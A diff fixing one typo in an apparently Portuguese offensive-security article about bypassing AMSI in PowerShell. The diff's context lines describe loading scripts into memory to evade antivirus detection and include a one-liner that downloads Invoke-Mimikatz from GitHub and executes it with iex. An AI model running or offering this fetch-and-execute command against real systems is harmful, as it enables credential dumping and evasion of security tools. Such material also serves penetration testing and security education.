@@ -29,7 +29,7 @@ Existem vários métodos conhecidos, e funcionais disponíveis na internet, por�
 
 ## *Bypass* de AMSI no Powershell
 
-Normalmente, para carregar um scrip PowerShell em memória para evitar detecção de arquivo malicioso por antivírus, utilizamos a função `Invoke-Expression`, em casos normais, como por exemplo, importar o `Invoke-Mimikatz`, utilizamos da seguinte forma:
+Normalmente, para carregar um script PowerShell em memória para evitar detecção de arquivo malicioso por antivírus, utilizamos a função `Invoke-Expression`, em casos normais, como por exemplo, importar o `Invoke-Mimikatz`, utilizamos da seguinte forma:
 
 ```powershell
 iex(New-object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1')
